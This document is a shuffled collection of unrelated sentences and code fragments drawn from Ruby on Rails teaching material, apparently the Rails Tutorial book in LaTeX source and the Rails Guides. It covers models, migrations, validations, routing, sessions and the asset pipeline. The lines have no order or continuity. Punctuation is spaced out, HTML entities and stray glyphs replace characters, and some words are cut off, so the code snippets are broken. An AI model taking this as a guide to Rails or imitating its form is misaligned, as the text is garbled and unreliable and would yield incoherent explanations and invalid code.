are all the same ▖ \ emph { Hint } : It &apos;s probably easiest to compare directly using \ kode { = = } ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-e4ef4b &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection a _ proto _ feed ( end ) ╼ ╼ \ subsection { Destroying microposts } % ( fold ) ╼ \ label { sec : destroying _ microposts } ╼ ╼
The Rails Way is to use migrations every time we discover that our data model needs to change .
Contributing to Ruby on Rails
content : encoded _ content
Tests protect against \ emph { regressions } , where a functioning feature stops working for some reason .
In Section ~ \ ref { sec : signing _ in } , we used the Rails \ kode { session } method to store the user &apos;s id , but this information disappears when the user closes their browser .
orders ▖ exists ? ( ▖ ▖ ▖ )
This helper validates that the attribute &apos;s value is unique right before the ╼ object gets saved ▖
* &#91; Revving Filenames : don &apos;t use querystring &#93; ( http : / / www ▖ stevesouders ▖ com / blog / 2008 / 08 / 23 / revving-filenames-dont-use-querystring / )
Then change it to use the Markdown extension ~ \ kode { ▖ md } and commit the changes :
Ambitious readers are invited to try their hand at implementing it .
Your bundle is complete !
As a result , the tests for the Home page should now pass .
Note that Listing ~ \ ref { code : rails _ command } explicitly includes the Rails version number ( \ kode { \ _ 4 ▖ 2 ▖ 0 \ _ } ) as part of the command .
The site layout with added structure .
* How to send and receive email within a Rails application .
Quite a bit , actually :
With these considerations in mind , we can create a valid token and associated digest by first making a new remember token using \ kode { User ▖ new \ _ token } , and then updating the remember digest with the result of applying \ kode { User ▖ digest } ▖ This procedure gives the \ kode { remember } method shown in Listing ~ \ ref { code : user _ model _ remember } .
( The alert reader might notice at this point that the second \ kode { return } here is actually unnecessary---being the last expression in the function , the string \ kode { &quot; The string is nonempty ▖ &quot; } \ will be returned regardless of the \ kode { return } keyword , but using \ kode { return } in both places has a pleasing symmetry to it ▖ )
For example , ╼ to run Action Mailer tests :
When duplicate connection information is provided the environment variable will take precedence :
resources : user _ permissions , controller : &apos; admin / user _ permissions&apos;
I18n ▖ with _ options locale : user ▖ locale , scope : &quot; newsletter &quot; do &#124; i18n &#124;
\ begin { equation } ╼ \ label { eq : time _ delta } ╼ \ Delta t _ r &gt; \ Delta t _ e .
When we last saw our new application , we had just updated our mostly static pages to use Rails layouts to eliminate duplication in our views , as shown in Listing ~ \ ref { code : application _ layout _ redux } ( which is the same as Listing ~ \ ref { code : application _ layout } ) .
# via a named scope
which checks for a \ kode { div } tag .
errors &#91; : base &#93; &lt; &lt; &quot; This person is invalid because ▖ ▖ ▖ &quot;
# # # # option _ groups _ from _ collection _ for _ select
For example , you could redirect from wherever you are in your code to the index of photos in your application with this call :
cookies ▖ encrypted &#91; : expiration _ date &#93; # = &gt; &quot; 2014-03-20 &quot;
The user \ kode { index } action .
This uses the built-in Rails function \ kode { stylesheet \ _ link \ _ tag } ( which you can read more about at the \ href { http : / / api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / AssetTagHelper ▖ html # method-i-stylesheet _ link _ tag } { Rails API } ) to include \ kode { application ▖ css } for all \ href { http : / / www ▖ w3 ▖ org / TR / CSS2 / media ▖ html } { media types } ( including computer screens and printers ) .
In a typical Rails application this includes vendored gems .
Having generated and explored the Users resource , we turn now to the associated Microposts resource .
Whenever a bug is found , write a test to reproduce it and protect against regressions , then write the application code to fix it .
/ / = require slider
We come now to the pinnacle of our sample application : the status feed of microposts .
Most migrations ( including all the ones in this tutorial ) are \ emph { reversible } , which means we can ``migrate down &apos; &apos; and undo them with a single Rake task , called \ kode { db : rollback } :
Change the username and password in the `development` section as appropriate .
If hours are zeroed , then minutes and seconds are too ( unless they have given values ) :
in Listing ~ \ ref { code : initial _ signup _ test } .
* You must not run the Capistrano deployment task that precompiles assets .
For the purposes of this tutorial , I suggest creating a gemset called \ kode { railstutorial \ _ rails \ _ 4 \ _ 0 } :
Article ▖ where ( &apos; id &gt; 10 &apos; ) ▖ limit ( 20 ) ▖ order ( &apos; id desc &apos; ) ▖ only ( : order , : where )
# Table name : users
The HTML generated for this would be :
Having written tests for signin failure , we now turn to signin success .
* ` : type` specifies an explicit MIME type ▖
&quot; Backoffice : : Session &quot; ▖ underscore # = &gt; &quot; backoffice / session &quot;
If you are using a database in a production environment Rails most likely has an adapter for it .
# # # Connection Preference
You can pass an object in to this local variable via the ` : object` option :
require &apos; active _ support&apos;
render layout : &quot; old &quot;
Initially , I called the new attribute \ kode { image } , but that name was so generic it ended up being confusing .
We can send email in production using SendGrid .
before _ enqueue do &#124; job &#124;
Instead , we will exploit the underlying symmetry between followers and followed users to simulate a \ kode { reverse \ _ relationships } table by passing \ kode { followed \ _ id } as the primary key .
# # # Using a Proc with ` : if` and ` : unless`
Then you can use their remote branch to update your codebase ▖
To get the application working upon submission of a valid email address as well , we need to define a password reset mailer method .
X : : Y : : Z ▖ parents # = &gt; &#91; X : : Y , X , Object &#93;
We &apos;ll also add a way to \ emph { authenticate } a user based on a given password , a method we &apos;ll use in Chapter ~ \ ref { cha : log _ in _ log _ out } to allow users to log in to the site .
# has _ secure _ password
Our final task is to display the number of microposts for each user , which we can do with the \ kode { count } method :
as shown in Listing ~ \ ref { code : user _ relationships _ method _ test } .
Next , we migrate as usual :
A model of followed users through user relationships .
Inside the file for the custom CSS , we can use the \ kode { @ import } function to include Bootstrap ( together with the associated Sprockets utility ) , as shown in Listing ~ \ ref { code : bootstrap _ css }
# # # # Rendering Vanilla JavaScript
Sometimes it is frustrating , and it &apos;s easy to get impatient when you have an awesome web app in your head and you \ emph { just want to learn Rails already } , but have to spend a week learning some weird ancient Unix editor just to get started .
In case you are not familiar with Rack &apos;s basics , you should check out the &#91; Resources &#93; ( # resources ) section below .
# # # # Far-future Expires Header
boolean ? ?
tomorrow
# attribs : id , name
date ▖ beginning _ of _ day # = &gt; Mon Jun 07 00 : 00 : 00 + 0200 2010
The new user page ( \ href { http : / / localhost : 3000 / users / new } { / users / new } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / demo _ new _ user _ rails _ 3-full ▖ png } { ( full size ) }
In other words , a user starts on another user &apos;s profile page , follows the other user , and is immediately redirected back to the original page .
A user with updated information .
When the application is asked to render the view for `Blorgh : : ArticlesController` &apos; s ╼ index action , it will first look for the path ╼ `app / views / blorgh / articles / index ▖ html ▖ erb` within the application ▖
In Listing ~ \ ref { code : password _ reset _ edit _ action } , compare the use of
# The Expires * directives requires the Apache module
Using the \ kode { full \ _ title } helper in a test ▖
Next , we need to configure Rails to use RSpec in place of \ kode { Test : : Unit } .
# = &gt; ArgumentError : invalid date
Applying this discussion to the User model yields the generalized \ kode { authenticated ? } \ method shown in Listing ~ \ ref { code : generalized _ authenticated _ p } .
has _ one : through Association Diagram &#93; ( images / has _ one _ through ▖ png )
has _ many : tags
# = &gt; Tue , 08 Jun 2010 01 : 56 : 22 + 0000
Our first step is to get the following and followers links to work .
( Actually , using \ kode { get } in place of \ kode { match } gives the same named routes , but using \ kode { match } is more conventional ▖ )
TIP : You &apos;ll find that the output from `rake routes` is much more readable if you widen your terminal window until the output lines don &apos;t wrap .
# initialization code goes here
constraints : BlacklistConstraint ▖ new
# # # `with _ options`
Defaults to `ActionDispatch : : PublicExceptions ▖ new ( Rails ▖ public _ path ) ` .
@ msg = &quot; No account found for this supplier &quot;
Here &apos;s an example of a very simple validation :
user = User ▖ new do &#124; u &#124;
in the Software without restriction , including without limitation the rights
By passing the symbol \ kode { : user } to the \ kode { factory } command , we tell Factory Girl that the subsequent definition is for a User model object .
Since the Home , Help , and About page titles have a variable component , we &apos;ll use a special Rails function called \ kode { provide } to set a different title on each page .
For example , if an order belongs to a customer , but the actual name of the model containing customers is `Patron` , you &apos;d set things up this way :
else
Signup failure renders the new user page and displays error messages automatically determined by Active Record .
-----------------
a1 ▖ x # = &gt; 1 , comes from A
Some browsers offer an option to restore such sessions via a ``continue where you left off &apos; &apos; feature , but of course Rails has no control over this behavior .
Follow the \ href { http : / / devcenter ▖ heroku ▖ com / articles / local-postgresql } { Heroku instructions for local PostgreSQL installation } to install the PostgreSQL database on your local system .
For example , if a customer has many orders , but the actual name of the model containing orders is `Transaction` , you &apos;d set things up this way :
to use , copy , modify , merge , publish , distribute , sublicense , and / or sell
A working preview method for account activation .
The default environment for the Rails console is \ texttt { development } :
The easiest and recommended way to get a development environment ready to hack is to use the &#91; Rails development box &#93; ( https : / / github ▖ com / rails / rails-dev-box ) .
We &apos;ll get started in Chapter ~ \ ref { cha : static _ pages } by creating static pages and then add a little dynamic content .
Normally , websites run on port 80 , but this usually requires special privileges , so Rails picks a less restricted higher-numbered port for the development server .
It is explicitly set to true in `config / environments / production ▖ rb` .
Here are some things to think about :
Second , the method itself is only used internally by the User model , so there &apos;s no need to expose it to outside users .
&lt; p &gt; Customer : &lt; % = customer ▖ name % &gt; &lt; / p &gt;
One way to use partials is to treat them as the equivalent of subroutines ; a way to move details out of a view so that you can grasp what &apos;s going on more easily ▖
In earlier 2008 , malicious code appeared in banner ads on popular sites , such as MySpace and Excite , according to &#91; Trend Micro &#93; ( http : / / blog ▖ trendmicro ▖ com / myspace-excite-and-blick-serve-up-malicious-banner-ads / ) .
The `content _ for` method allows you to insert content into a named `yield` block in your layout ▖
When constructing a form using \ kode { form \ _ for ( @ user ) } , Rails uses \ texttt { POST } if \ linebreak \ kode { @ user ▖ new \ _ record ? } \ is \ kode { true } and \ texttt { PATCH } if it is \ kode { false } .
The `validates _ with` helper takes a class , or a list of classes to use for ╼ validation ▖
We &apos;ll learn more about foreign keys in Section ~ \ ref { sec : relationship _ user _ associations } .
NOTE : Defined in `active _ support / core _ ext / class / subclasses ▖ rb` .
( If you already started a server in your first tab , press Ctrl-C to shut it down ▖ )
The full data model appears in Figure ~ \ ref { fig : user _ model _ account _ activation } .
The issue is that web application repositories might contain potentially sensitive information such as cryptographic keys and passwords , which could be used to compromise the security of a site running the code .
t ▖ string : name
Client ▖ select ( &quot; viewable _ by , locked &quot; )
That &apos;s ok , we can ignore that for now ▖
The case of valid data is similar , but instead of verifying that the user count doesn &apos;t change , we check that clicking the button changes the count by 1 :
The class `DateTime` is a subclass of `Date` so by loading `active _ support / core _ ext / date / calculations ▖ rb` you inherit these methods and their aliases , except that they will always return datetimes :
Note that we &apos;ve taken this opportunity to introduce an \ kode { if } - \ kode { else } branching structure , which allows us to handle the cases of failure and success separately based on the value of \ kode { @ user ▖ save } , which ( as we saw in Section ~ \ ref { sec : creating _ user _ objects } ) is either \ kode { true } or \ kode { false } depending on whether or not the save succeeds .
Mailer Testing
How detailed you want to make your tests is up to you ; a suggested template appears in Listing ~ \ ref { code : error _ messages _ test } .
In order to get our bearings , it &apos;s helpful to recall the Rails directory structure from Section ~ \ ref { sec : the _ first _ application } ( Figure ~ \ ref { fig : directory _ structure _ rails } ) .
We &apos;ll end with a couple of more general ways of finding users .
So how do we know if we really destroyed an object ?
Pages to display followed users and followers will resemble a hybrid of the user profile page and the user index page ( Section ~ \ ref { sec : user _ index } ) , with a sidebar of user information ( including the following stats ) and a list of users .
No meaningful tests
create app / views / blorgh / articles
( Note the index on \ kode { user \ _ id } and \ kode { created \ _ at } ▖ )
X1 = 1
It is shown only for purposes of illustration ▖ )
# app / controllers / users _ controller ▖ rb
As with most previous examples of access control , we &apos;ll write the tests first , as shown in Listing ~ \ ref { code : following _ followers _ authorization _ test } .
use # &lt; ActiveSupport : : Cache : : Strategy : : LocalCache : : Middleware : 0x00000001c304c8 &gt;
Updating the errors for password resets .
&lt; div &gt;
= &gt; 42
Correct code for failed login ▖
To make a working activation email , we &apos;ll first customize the generated template as shown in Listing ~ \ ref { code : application _ mailer } .
To pass the object to the partial , we use a hash with value equal to the object and key equal to the desired name of the variable in the partial , which is what this code accomplishes :
Now that we &apos;ve filled in several of the layout links , it &apos;s a good idea to test them to make sure they &apos;re working correctly .
Listing ~ \ ref { code : micropost _ ordering } introduces the ``stabby lambda &apos; &apos; syntax for an object called a \ emph { Proc } ( procedure ) or \ emph { lambda } , which is an \ emph { anonymous function } ( a function created without a name ) .
If you do this , you put your entire database at risk because once a user finds out they can exploit your database they can do just about anything to it ▖
As noted in Section ~ \ ref { sec : updating _ user _ objects } , this method bypasses the validations , which is necessary in this case because we don &apos;t have access to the user &apos;s password or confirmation ▖ )
You can associate the ` : if` and ` : unless` options with a symbol corresponding ╼ to the name of a method that will get called right before validation happens .
These are common validation options :
1235551234 ▖ to _ s ( : phone , area _ code : true )
As a general rule , if a method doesn &apos;t need an instance of an object , it should be a class method .
At this point the User model specs should be passing :
You can also override conditions using the `only` method ▖
# the default ( validates on both create and update )
Correct code for failed signin .
* You may be deploying to more than one server , and want to avoid ╼ duplication of work .
These two forms both use \ kode { form \ _ for } to manipulate a Relationship model object ; the main difference between the two is that Listing ~ \ ref { code : follow _ form } builds a \ emph { new } relationship , whereas Listing ~ \ ref { code : unfollow _ form } finds the existing relationship .
We start by noting that the \ kode { params } hash for submitted login forms now includes a value based on the checkbox ( as you can verify by submitting the form in Listing ~ \ ref { code : remember _ me _ checkbox } with invalid information and inspecting the values in the debug section of the page ) .
As a first step toward adding links and styles to the sample application , we &apos;ll update the site layout file \ kode { application ▖ html ▖ erb } ( last seen in Listing ~ \ ref { code : application _ layout _ full _ title } ) with additional HTML structure .
&lt; % = form _ for &#91; @ article , @ article ▖ comments ▖ build &#93; do &#124; f &#124; % &gt;
# # # Time
# # # Static Segments
The &#91; cache control ╼ header &#93; ( http : / / www ▖ w3 ▖ org / Protocols / rfc2616 / rfc2616-sec14 ▖ html # sec14 ▖ 9 ) is a W3C ╼ specification that describes how a request can be cached ▖
* `from`
will return \ kode { true } inside an integration test and false otherwise .
( Recall from Section ~ \ ref { sec : uniqueness _ validation } that email addresses are saved as all lower-case , so here we use the \ kode { downcase } method to ensure a match when the submitted address is valid ▖ )
The test suite should now be \ passing :
Let &apos;s see what the full ╼ thing looks like :
In the case of our User model , each user potentially has many microposts .
In fact , the two are exactly equivalent ; \ kode { attr \ _ accessor } is merely a convenient way to create just such getter / setter methods automatically .
render &apos; edit&apos;
A file for RSpec utilities with a \ kode { full \ _ title } function .
is part of the asset pipeline ( Section ~ \ ref { sec : sass _ and _ the _ asset _ pipeline } ) , and any stylesheets in this directory will automatically be included as part of the \ kode { application ▖ css } file included in the site layout .
This is useful anyway , but just in case you don &apos;t have it set ╼ up , make sure that you do this first :
This is because anything other than \ texttt { nil } or \ texttt { false } is \ texttt { true } in a boolean context , and the series of \ texttt { &#124; &#124; } expressions terminates after the first true expression is evaluated .
If this example strikes you as a bit contrived , good ; this is by design .
In development mode , Rails does not generally require you to ╼ restart the server ; changes you make in files will be automatically picked up by ╼ the server .
# The visible _ articles method below is expected to return a Relation .
Image upload in production .
puts client ▖ address ▖ postcode
Pronounced ``Engine X &apos; &apos; .
With that , the core follow / unfollow functionality is complete , and any user can follow ( or unfollow ) any other user , which you should verify both by clicking around in the sample application and by running the test suite :
You should use this option only when the string ╼ represents a really short condition .
There are cases where the user time zone might be in the future compared to the system time zone , which `Time ▖ now` uses by default ▖
$ rails c
= &gt; String
In order to validate associated records whose presence is required , you must ╼ specify the ` : inverse _ of` option for the association :
NoMethodError : You have a nil object when you didn &apos;t expect it !
While these are sufficient for most use cases , there are circumstances when you want more environments .
Change the content of the \ kode { hello } action in Listing ~ \ ref { code : hello _ action } to read ``hola , mundo ! &apos; &apos; instead of ``hello , world ! &apos; &apos; .
Once Guard is configured , you should open a new terminal and ( as with the Rails server in Section ~ \ ref { sec : rails _ server } ) run it at the command line as follows :
You can ask that `nil` is returned instead with the ` : allow _ nil` option :
You might find ╼ someone who &apos;s also interested in building that feature ▖
Finally , I needed to tell RVM where OpenSSL was located when installing Ruby ~ 2 ▖ 0 ▖ 0 :
\ label { fig : heroku _ sample _ users } } ╼ \ end { figure } ╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : updating _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ ╼ \ item
Now the Alice scenario above will work fine : the database will save a user record based on the first request , and will reject the second save for violating the uniqueness constraint .
\ href { http : / / peepcode ▖ com / } { PeepCode } and \ href { http : / / mbsy ▖ co / 6VQ8l } { Code School } : The screencasts at PeepCode and interactive courses at Code School are consistently high-quality , and I warmly recommend them .
At each stage of developing the sample application , we will write \ emph { small , bite-sized } pieces of code---simple enough to understand , yet novel enough to be challenging .
Besides the standard `assets / * ` paths , additional ( fully qualified ) paths can be ╼ added to the pipeline in `config / application ▖ rb` ▖
To implement the forwarding itself , we use the \ kode { redirect \ _ back \ _ or } method to redirect to the requested URL if it exists , or some default URL otherwise , which we add to the Sessions controller \ kode { create } action to redirect after successful login ( Listing ~ \ ref { code : friendly _ session _ create } ) .
╼ = &gt; true
def self ▖ broadcast _ notifications ( users , ▖ ▖ ▖ )
&quot; AdminUser &quot; ▖ underscore # = &gt; &quot; admin _ user &quot;
The files ╼ in `app / assets` are never served directly in production .
This detail will never be important in this tutorial , and the foreign key constraint isn &apos;t even supported by all databases .
format ▖ json { render json : @ user }
&#124; &#124; 506 &#124; : variant _ also _ negotiates &#124;
This can be done quite simply with the ` : url` option of `form _ for` ▖ ╼
in Listing ~ \ ref { code : name _ title _ and _ heading } .
&lt; div id = &quot; right _ menu &quot; &gt; Right menu items here &lt; / div &gt;
We &apos;ll first get set up with a free service to send email , and then configure and deploy our application .
Checking for this requires the use of the ``not &apos; &apos; operator ( Section ~ \ ref { sec : objects _ and _ message _ passing } ) , written using an exclamation point ~ \ kode { ! } and usually read as ``bang &apos; &apos; .
The method `ordinalize` returns the ordinal string corresponding to the receiver integer ▖
Making a ``deep copy &apos; &apos; is a much more difficult problem , and in fact has no general solution , but dropping ``ruby deep copy &apos; &apos; into a search engine should be enough to get you started if you need to copy a more complicated structure such as a nested array ▖ )
module Blorgh : : Concerns : : Models : : Article
* `find _ all _ by _ ▖ ▖ ▖ ` becomes `where ( ▖ ▖ ▖ )
( Note the nesting of the table CSS rules , which works only because of the Sass engine used by the asset pipeline ▖ )
* How to use Active Record models to manipulate data stored in a relational ╼ database .
* Rails 4 prefers Ruby 2 ▖ 0 and requires 1 ▖ 9 ▖ 3 or newer .
Client ▖ where ( &quot; created _ at &gt; = : start _ date AND created _ at &lt; = : end _ date &quot; ,
Recall that the id of the user is available in the \ kode { params &#91; : id &#93; } variable , which means that we can find the user with the code in Listing ~ \ ref { code : initial _ edit _ action } .
Update your fork :
\ begin { equation } ╼ \ label { eq : delta _ e } ╼ \ Delta t _ e = t _ N - t _ e .
&lt; % = audio _ tag &quot; music / first _ song ▖ mp3 &quot; % &gt;
% w ( Earth Wind Fire ) ▖ to _ sentence # = &gt; &quot; Earth , Wind , and Fire &quot;
# # # Usage of `return` within inline callback blocks
The only downside to this code is that it requires a round trip to the browser : the browser requested the show action with ` / books / 1` and the controller finds that there are no books , so the controller sends out a 302 redirect response to the browser telling it to go to ` / books / ` , the browser complies and sends a new request back to the controller asking now for the `index` action , the controller then gets all the books in the database and renders the index template , sending it back down to the browser which then shows it on your screen .
You can have as many manifest files as you need ▖
This means that if you were to make a ╼ typical `GET` to a controller in a controller &apos;s functional test like this :
If you &apos;re using Sublime Text , there is a powerful set of helper commands to run tests directly inside the editor .
Implementing the user / relationships \ kode { has \ _ many } association .
account ▖ to _ query ( &apos; company &#91; name &#93; &apos; )
layout &apos; awesome &apos; # use awesome ▖ ( html &#124; text ) ▖ erb as the layout
As with the first line , what goes inside the quote marks is irrelevant to RSpec , and is intended to be descriptive to human readers .
The seed data code with an admin user .
The default page with the application &apos;s environment .
# # # # # `collection ▖ where ( ▖ ▖ ▖ )
Default is ` : utc` .
* The basic principles of MVC ( Model , View , Controller ) and RESTful design .
d = Date ▖ new ( 2010 , 5 , 8 ) # = &gt; Sat , 08 May 2010
# # # Usage
# # # # A note on Decorators and Loading Code
With the test in Listing ~ \ ref { code : signup _ with _ account _ activation _ test } , we &apos;re ready to refactor a little by moving some of the user manipulation out of the controller and into the model .
Let &apos;s look at the new elements in Listing ~ \ ref { code : layout _ new _ structure } from top to bottom .
Now that we have tests for the URLs we want , it &apos;s time to get them to work .
* Otherwise , if the argument responds to `to _ ary` it is invoked , and if the value of `to _ ary` is not `nil` , it is returned .
At present , newly registered users immediately have full access to their accounts ( Chapter ~ \ ref { cha : sign _ up } ) .
After you &apos;ve merged in the changes , you can tidy up your branches by deleting the topic branch using \ kode { git branch -d } if you &apos;re done with it :
REST is an architectural style for developing distributed , networked systems and software applications such as the World Wide Web and web applications .
At this early stage , writing tests might thus seem hopelessly intimidating .
Before we dig into more details , let &apos;s talk about how validations fit into the ╼ big picture of your application .
&lt; % = render @ products % &gt;
class Proc
You can even use an inline method , such as a Proc , to determine the layout ▖
will return instead a maximum of 5 clients beginning with the 31st ▖
As noted in a comment in Listing ~ \ ref { code : backtrace _ silencer } , you should restart the local webserver after adding the silencer .
Note that we actually have to include the \ emph { class } name for this association , i ▖ e ▖ ,
&lt; / table &gt;
Despite this impressive list , there is still much to learn about web development .
# = &gt; &#91; &apos; admin &apos; , &apos; member &apos; , &apos; guest &apos; &#93;
Example Code
( We could have written the tests first , but the named routes would have been hard to motivate without the updated routes file ▖ )
If you want to see how many records are in your model &apos;s table you could call `Client ▖ count` and that will return the number ▖
Of course , \ kode { user \ _ with \ _ same \ _ email ▖ valid ? } \ is \ kode { true } , because the uniqueness validation is currently case-sensitive , but we want it to be \ kode { false } .
( Ruby even lets you put semicolons at the ends of lines if you miss them too much ▖ )
in Listing ~ \ ref { code : palindrome _ if } .
The method `camelize` returns its receiver in camel case :
Rails 4 creates both `app / assets / javascripts / application ▖ js` and ╼ `app / assets / stylesheets / application ▖ css` regardless of whether the ╼ --skip-sprockets option is used when creating a new rails application ▖
There is a default error ╼ message for each one of the validation helpers ▖
The params hash has a nested person value , which can therefore be accessed with params &#91; : person &#93; in the controller .
As you &apos;ve already seen , the ` : message` option lets you specify the message that ╼ will be added to the `errors` collection when validation fails ▖
The rest of the book is dedicated to fleshing out the sample application : first , by adding users who can sign up , sign in , and sign out ; next , by adding user microposts ; and , finally , by adding the ability to follow other users .
Most of the adapters support multiple queues ▖
There needs to be a way ╼ of associating the records in the `blorgh _ articles` table with the records in the ╼ `users` table ▖
Using the generalized \ kode { authenticated ? } \
Note that the debug information in Figure ~ \ ref { fig : user _ show _ rails _ 3 } confirms the value of \ kode { params &#91; : id &#93; } :
invoke helper
As indicated by the helpful message ``Any modifications you make will be rolled back on exit &apos; &apos; , when started in a sandbox the console will ``roll back &apos; &apos; ( i ▖ e ▖ , undo ) any database changes introduced during the session .
This is a definite improvement , but we can do even better : we can call \ kode { render } \ emph { directly } on the \ kode { @ users } variable ( Listing ~ \ ref { code : index _ final _ refactoring } ) .
&quot; application-723d1be6cc741a3aabb1cec24276d681 ▖ js &quot; , &quot; application ▖ css &quot; :
We accomplish this with a pair of methods , \ kode { store \ _ location } and \ kode { redirect \ _ back \ _ or } , both defined in the Sessions helper ( Listing ~ \ ref { code : friendly _ forwarding _ code } ) .
I &apos;ll omit the output of console commands when they are not particularly instructive---for example , the results of \ kode { User ▖ new } .
create test / helpers / users _ helper _ test ▖ rb
&quot; people &quot; ▖ classify # = &gt; &quot; Person &quot;
&lt; % = link _ to &apos; welcome &apos; , welcome _ url % &gt;
# # # # # The ` : location` Option
Files in the \ kode { spec / support } directory are automatically included by RSpec , which means that we can write the Home tests as follows :
&lt; option value = &quot; &quot; &gt; Please select &lt; / option &gt;
resources : examples
The first refactoring attempt in the index view .
Adding a Users resource to the routes file .
We &apos;ve also included a call to \ kode { assert \ _ template } to check that a failed submission re-renders the \ kode { new } action .
( The \ href { http : / / railscasts ▖ com / episodes / 267-coffeescript-basics } { RailsCast on CoffeeScript basics } is a good place to start ▖ )
@ article ▖ destroy
Adding a length validation for the \ kode { name } attribute ▖
scope &apos; admin &apos; do
Produce a string representation of a number as currency :
authenticated ? ( : activation , token )
Before attempting to upgrade an existing application , you should be sure you have a good reason to upgrade ▖
We &apos;ll see how to push the changes up to a remote repository ( using \ kode { git push } ) in Section ~ \ ref { sec : git _ commands } .
In these cases , it is ╼ recommended that you use the block form of `unscoped` :
# &lt; url-id &gt; jeremy-kemper &lt; / url-id &gt;
The easiest way to work with Rails is to store all external data as UTF-8 ▖
stringish ▖ to _ s ▖ html _ safe
The `collection ▖ create` method returns a new object of the associated type ▖
orphan = Object ▖ send ( : remove _ const , : M )
In case you &apos;re curious about \ kode { &quot; 2014-07-24 00 : 57 : 46 &quot; } , I &apos;m not writing this after midnight ; the timestamps are recorded in \ href { http : / / en ▖ wikipedia ▖ org / wiki / Coordinated _ Universal _ Time } { Coordinated Universal Time } ( UTC ) , which for most practical purposes is the same as \ href { http : / / en ▖ wikipedia ▖ org / wiki / Greenwich _ Mean _ Time } { Greenwich Mean Time } .
@ user = User ▖ new
To take advantage of the upcoming style elements , we &apos;ll add some extra elements to
NOTE : Defined in `active _ support / core _ ext / array / extract _ options ▖ rb` .
# SELECT person _ id FROM people
create app / views / users / show ▖ html ▖ erb
Run the migration using :
( Listing ~ \ ref { code : microposts _ interface _ test } uses \ kode { post } followed by \ kode { follow \ _ redirect ! }
* `config ▖ middleware ▖ insert _ before ( existing _ middleware , new _ middleware , args ) ` - Adds the new middleware before the specified existing middleware in the middleware stack .
Their arguments are assumed to be qualified constant ╼ names relative to their receiver :
Otherwise , you risk your app or gem breaking when you upgrade to a newer release of Rails .
If you set the ` : validate` option to `false` , then associated objects will not be validated whenever you save this object ▖
The final line in the block , \ kode { t ▖ timestamps } , is a special command that creates two \ emph { magic columns } called \ kode { created \ _ at } and \ kode { updated \ _ at } , which are timestamps that automatically record when a given user is created and updated .
This is perfectly valid :
\ href { http : / / www ▖ thinkful ▖ com / a / railstutorial } { Thinkful } : An online class that pairs you with a professional engineer as you work through a project-based curriculum .
is a project to make a book and screencasts to teach web development
module A
&#124; PRIMARY &#124; 4 &#124; const &#124; 1 &#124; &#124;
class Supplier &lt; ActiveRecord : : Base
Starts a form tag that points the action to an url configured with `url _ for _ options` just like `ActionController : : Base # url _ for` .
This isn &apos;t technically true---the scaffolding includes rudimentary tests---but the generated tests don &apos;t test for data validation , authentication , or any other custom requirements .
# # # config / environments / production ▖ rb
ubsection current _ user ( end ) ╼ ╼ \ subsection { Changing the layout links } % ( fold ) ╼ \ label { sec : changing _ the _ layout _ links } ╼ ╼
The view for the About page with an embedded Ruby title ▖
By default , the `stylesheet _ link _ tag` creates links with `media = &quot; screen &quot; rel = &quot; stylesheet &quot; ` ▖
Then , in Chapter ~ \ ref { cha : filling _ in _ the _ layout } through Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } , we &apos;ll complete the foundation for the sample application by making a site layout , a user data model , and a full registration and authentication system ( including account activation and password resets ) .
We can then use bcrypt to verify that \ kode { cookies &#91; : remember \ _ token &#93; } matches the \ kode { remember \ _ digest } generated in Listing ~ \ ref { code : user _ model _ remember } .
For example : `constraints : { subdomain : &apos; api &apos; } ` will match an `api` subdomain as expected , however using a symbol `constraints : { subdomain : : api } ` will not , because `request ▖ subdomain` returns ` &apos; api &apos; ` as a String .
This step is optional , and in fact it &apos;s quite common to leave the topic branch intact .
This could lead to ╼ problems if the table wasn &apos;t already existing ▖
Only RDoc and guides can be edited via docrails ▖
If the feedback is that your code doesn &apos;t belong in the core , you might still think about releasing it as a gem .
The Relationship data model .
Testing the following / follower statistics on the Home page .
customer ▖ orders ▖ empty ?
$ git remote add rails git : / / github ▖ com / rails / rails ▖ git
Normal callbacks hook into the life cycle of Active Record objects , allowing you to work with those objects at various points ▖
This exercise is solved in Section ~ \ ref { sec : contact _ page } .
This can be made to happen if ╼ this line is inserted into the `config / routes ▖ rb` file inside the engine :
In the present case , this function is
( If you &apos;re using the cloud IDE , you should first download the database file to the local disk , as shown in Figure ~ \ ref { fig : sqlite _ download } ▖ )
Though \ kode { 0 ▖ ▖ 9 } is a valid range , the second expression above shows that we need to add parentheses to call a method on it .
The next step is to address the difficulty of displaying a potentially large number of microposts .
* `extending`
The argument of the \ kode { scaffold } command is the singular version of the resource name ( in this case , \ kode { User } ) , together with optional parameters for the data model &apos;s attributes
Article ▖ joins ( comments : : guest )
If either of these saves fails due to validation errors , then the assignment statement returns `false` and the assignment itself is cancelled .
\ kode { f ▖ object } is \ kode { @ micropost } .
Those users couldn &apos;t even sign up ; now users can sign up , log in , log out , view their profiles , edit their settings , and see an index of all users---and some can even destroy other users .
( Note that this takes effect immediately ; you don &apos;t need to click a ``Save &apos; &apos; button ▖ )
Rails will generate an appropriate MIME type automatically .
For example , given the declaration :
The result should be a \ passing \ test suite :
For convenience , Listing ~ \ ref { code : micropost _ css } actually has \ emph { all } the CSS needed for this chapter .
These should be ╼ used in the order the processing should be applied ▖
-------------
In this case , though , such a test involves several new ideas , so for now it &apos;s best deferred to its own section ( Section ~ \ ref { sec : testing _ layout _ changes } ) .
get &apos; : controller / : action / : id / : user _ id&apos;
We come now to the pinnacle of our sample application : the status feed .
with the single line
Finally , the \ kode { create \ _ remember \ _ token } method needs to \ emph { assign } to one of the user attributes , and in this context it is necessary to use the \ kode { self } keyword in front of \ kode { remember \ _ token } :
Produce a string representation of a number in human-readable words :
Extensions to `Numeric`
The methods `second` , `third` , `fourth` , and `fifth` return the corresponding element ( `first` is built-in ) ▖
has _ many : expenses , dependent : : destroy
With the HTML elements and CSS classes in place , we can style the profile page ( including the sidebar and the Gravatar ) with the SCSS shown in Listing ~ \ ref { code : sidebar _ css }
To solve the problem of a missing page title , we &apos;ll define a custom helper called \ kode { full \ _ title } .
Write a test for the flash implemented in Section ~ \ ref { sec : the _ flash } .
* Do you like the implementation ?
For most applications , this should be a transparent change ▖
